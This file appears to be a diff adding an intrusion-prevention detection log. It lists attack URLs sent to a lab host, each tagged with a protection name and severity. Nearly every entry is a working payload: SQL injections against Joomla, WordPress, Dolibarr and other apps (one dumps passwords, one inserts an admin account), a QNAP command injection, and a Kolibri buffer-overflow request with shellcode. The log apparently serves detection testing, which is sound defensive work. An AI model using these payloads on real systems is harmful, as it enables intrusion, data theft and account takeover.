@@ -1,0 +1,138 @@
+ URL: http://192.168.103.2/ossim/dashboard/sections/widgets/data/gauge.php?&type=alarm&wtype=blah&asset=1&height=1&value=a%3A1%3A%7Bs%3A4%3A%22type%22%3Bs%3A67%3A%22pass+from+users+INTO+OUTFILE+%27%2Ftmp%2F1.1.1.1_pass_tshark.pcap%27--+-%22%3B%7D
+ Attack Info: Alienvault Unified Security Management and OSSIM gauge.php SQL Injection
+ Protection Name: Alienvault Unified Security Management and OSSIM gauge.php SQL Injection
+ Severity: 3
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/cgi-bin/userConfig.cgi?func=cloudPersonalSmtp&sid=SIDVALUE&hash=`(echo
+ Attack Info: QNAP QTS Multiple Command Injection Vulnerabilities (CVE-2017-6361)
+ Protection Name: QNAP QTS Multiple Command Injection Vulnerabilities (CVE-2017-6361)
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/gadgets/definitions/uptime.CapacityWhatIfGadget/getmetrics.php?query_type=osperf-Mem&element=1%20AND%20SLEEP(5)
+ Attack Info: SQL Servers Time-based SQL Injection
+ Protection Name: SQL Servers Time-based SQL Injection
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/search/members.json?id%60%3D-1%29%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cuser%28%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23balisong=1
+ Attack Info: SQL Servers SQL Injection Evasion Techniques
+ Protection Name: SQL Servers SQL Injection Evasion Techniques
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/wordpress/wp-admin/admin.php?page=SpiderCalendar&%20search_events_by_title=&page_number=1&serch_or_not=&nonce_sp_cal=1e91ab0f6b&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3DSpiderCalendar&id_for_playlist=&asc_or_desc=1&order_by=id%2C(select*from(select(sleep(2)))a)
+ Attack Info: WordPress Form Maker Plugin SQL Injection (CVE-2019-10866)
+ Protection Name: WordPress Form Maker Plugin SQL Injection (CVE-2019-10866)
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/esbus/servlet/GetSQLData?SCHEMA=ESBUS_INTERNAL&TABLE=SCHEDULEDTASKS%20UNION%20ALL%20SELECT%201%20and%201=1&FIELD=LASTRUN&NOHEADER=1&SELECT=CLASS=com.esbus.appliance.SOD_PolicyCheck_SystemRun_TimerTask&OUT=XML
+ Attack Info: SQL Injection Scanning Attempt
+ Protection Name: SQL Injection Scanning Attempt
+ Severity: 3
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxebx08x90x908.x14x10x90x90x90x90x90x90x90x90fx8cxcbx80xfb#ux101xd2fx81xcaxffx0f1xdbBRSSSxb3xc0x80xfbxc0tx13<x05txeexb8t00wx89xd7xafuxe4xafuxe1xffxe7j)Xdxffx13x83xc4x0cZxebxe1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAt00wt00wx90x90x90x90x90x90x90x90xbalxb1x12x02xd9xc7xd9t$xf4^3xc9xb1Sx83xeexfc1Vx0ex03:xbfxf0xf7>Wvxf7xbexa8x17q[x99x17xe5(x8axa7m|'C#x94xbc!xecx9bux8fxcax92x86xbc/xb5x04xbfcx154pvTqm{x04*xf9.xb8_xb7xf23x13Ysxa0xe4XRw~x03tvS?=`xb0zxf7x1bx02xf0x06xcdZxf9xa50Sx08xb7uTxf3xc2x8fxa6x8exd4Txd4TP
+ Attack Info: SENKAS Kolibri Webserver GET Request Buffer Overflow
+ Protection Name: SENKAS Kolibri Webserver GET Request Buffer Overflow
+ Severity: 3
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/pixie_v1.04/admin/index.php?s=publish&x=filemanager&-----------------------------8321182121675739546763935949%20Content-Disposition:%20form-data
+ Attack Info: SQL Servers Unauthorized Commands SQL Injection
+ Protection Name: SQL Servers Unauthorized Commands SQL Injection
+ Severity: 3
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=(CASE%20WHEN%20(1573=1573)%20THEN%201573%20ELSE%201573*(SELECT%201573%20FROM%20DUAL%20UNION%20SELECT%209674%20FROM%20DUAL)%20END)
+ Attack Info: Joomla com_fields Component SQL Injection
+ Protection Name: Joomla com_fields Component SQL Injection
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/theme/eldy/style.css.php?lang=de%27%3BINSERT%20INTO%20llx_user%20VALUES%20(424242%2C%200%2C%20NULL%2C%20NULL%2C%201%2C%200%2C%20%271984-01-01%2000%3A00%3A00%27%2C%20%271984-01-01%2000%3A00%3A00.000%27%2C%20NULL%2C%20NULL%2C%20%27newadmin%27%2C%20NULL%2C%20%2761529519452809720693702583126814%27%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20NULL%2C%20%27SuperAdmin%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%201%2C%201%2C%201%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20%272017-03-10%2000%3A00%3A00%27%2C%20%272017-03-10%2000%3A00%3A00%27%2C%20NULL%2C%20%27%27%2C%20NULL%2C%201%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20NULL%2C%200%2C%20%27%27%2C%200%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL)%3B--%27
+ Attack Info: SQL Servers SQL Injection Evasion Technique
+ Protection Name: SQL Servers SQL Injection Evasion Technique
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/exponent/index.php?module=eaas&action=api&apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7
+ Attack Info: Exponent CMS eaasController.php api Function SQL Injection
+ Protection Name: Exponent CMS eaasController.php api Function SQL Injection
+ Severity: 3
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/index.php?controller=expComment&action=showComments&content_id=11%20union%20select%201,2,3,4,version(),6,7,8,9,10,11--%20s&config[disable_nested_comments]=1
+ Attack Info: SQL Servers UNION Query-based SQL Injection
+ Protection Name: SQL Servers UNION Query-based SQL Injection
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/GeniXCMS/register.php?activation=1'%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(version(),0x23,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)%23
+ Attack Info: SQL Servers MySQL Vendor-specific SQL Injection
+ Protection Name: SQL Servers MySQL Vendor-specific SQL Injection
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/mobiledoc/jsp/ccmr/clientPortal/admin/service/portalUserService.jsp?action=updatePersonalInfo&ufname=john&ulname=doe&upaddress=&upcity=&upstate=&zipcode=&uemail=john.doe@test.com'
+ Attack Info: Sqlmap Automated SQL Injection tool
+ Protection Name: Sqlmap Automated SQL Injection tool
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/ping.cgi?DIA_IPADDRESS=8.8.8.8
+ Attack Info: Command Injection Over HTTP
+ Protection Name: Command Injection Over HTTP
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/index.php?option=com_socialpinboard&view=ajaxcontrol&tmpl=component&task=getlikeinfo&pin_id=1%20and%201=1&user_id=1%20and%201=1::/www/index.php?option=com_socialpinboard&view=gift&starts=100&ends=1%20and%201=1::/www/index.php?option=com_socialpinboard&view=home&category=1%20and%201=1::/www/index.php?option=com_socialpinboard&view=pindisplay&uid=1%20and%201=1::/www/index.php?option=com_socialpinboard&view=search&serachVal=1%20and%201=1::/www/index.php?option=com_socialpinboard&view=likes&uid=1%20and%201=1
+ Attack Info: Multiple CMS Platforms SQL Injection Attempt Over URL
+ Protection Name: Multiple CMS Platforms SQL Injection Attempt Over URL
+ Severity: 3
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/api/sms_check.php?param=1%27and%20extractvalue(1,concat(0x7e,user()))%23
+ Attack Info: SQL Servers SQL Injection Obfuscation Techniques
+ Protection Name: SQL Servers SQL Injection Obfuscation Techniques
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/wordpress/wp-admin/admin.php?page=wpdevart_gallery_themes&task=add_edit_theme&id=-1+UNION+ALL+SELECT+NULL,@@VERSION,NULL,NULL--::/wordpress/wp-admin/admin.php?page=wpdevart_gallery_themes&task=add_edit_theme&id=1+and+1=0
+ Attack Info: SQL Servers MSSQL Vendor-specific SQL Injection
+ Protection Name: SQL Servers MSSQL Vendor-specific SQL Injection
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/phpCollab-v2.5.1/newsdesk/newsdesk.php?action=show&id=1%20and%20ascii(substr(md5(1),1,1))=99&PHPSESSID=aoanbk4f8dl89trecdir46dq82
+ Attack Info: SQL Servers Blind SQL Injection
+ Protection Name: SQL Servers Blind SQL Injection
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/index.php?option=com_visualcalendar&view=load&id=1%20and%201=1
+ Attack Info: Joomla com_visualcalendar Component SQL Injection
+ Protection Name: Joomla com_visualcalendar Component SQL Injection
+ Severity: 3
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/index.php?option=com_cpeventcalendar&task=load&id=1%20and%201=1
+ Attack Info: Joomla com_cpeventcalendar Component SQL Injection
+ Protection Name: Joomla com_cpeventcalendar Component SQL Injection
+ Severity: 3
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/index.php?option=com_gmap&view=gm_markers&tmpl=component&layout=form_markers&cid=1%20and%201=1&id=1&format=raw::/www/index.php?option=com_gmap&view=gm_markers&tmpl=component&layout=form_markers&cid=1&id=1%20and%201=1&format=raw::/www/index.php?option=com_gmap&view=gm_modal&tmpl=component&layout=default&map=1%20and%201=1
+ Attack Info: Joomla Ek Rishta Component SQL Injection
+ Protection Name: Joomla Ek Rishta Component SQL Injection
+ Severity: 3
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
+ URL: http://192.168.103.2/index.php/component/ekrishta/alluser?options=com_ekrishta&view=alluser&gender=1%20and%201=1&age1=1%20and%201=1&age2=1%20and%201=1&religion=1%20and%201=1&mothertounge=1%20and%201=1&caste=1%20and%201=1&country=1%20and%201=1
+ Attack Info: Joomla Ek Rishta SQL Injection (CVE-2018-7315)
+ Protection Name: Joomla Ek Rishta SQL Injection (CVE-2018-7315)
+ Severity: 4
+ Malware rule ID: {C5EA2C02-9BB1-46F7-8DBB-619479EEAA7F}
+
